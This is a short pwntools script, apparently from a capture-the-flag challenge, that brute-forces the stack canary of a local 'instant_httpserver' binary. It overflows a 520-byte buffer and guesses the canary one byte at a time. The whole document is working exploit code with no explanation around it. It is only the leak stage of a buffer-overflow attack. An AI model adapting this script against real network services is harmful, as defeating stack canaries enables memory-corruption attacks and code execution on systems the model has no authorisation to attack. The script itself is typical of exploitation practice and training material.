from pwn import *
from sys import argv
from time import sleep

context.log_level = "debug"

binfile = "./instant_httpserver"

elf = ELF(binfile)


canary = b""
for i in range(0, 8):
    for j in range(0, 256):
        p = remote("localhost", 4445)
        payload = b""
        payload += b"A" * 520
        payload += canary
        payload += j.to_bytes(1, "little")
        sleep(0.1)
        p.send(payload)
        buf = p.recv()
        p.close()
        if b"instant_httpserver -- localhost" in buf:
            canary += j.to_bytes(1, "little")
            break

print("canary:"+str(canary))

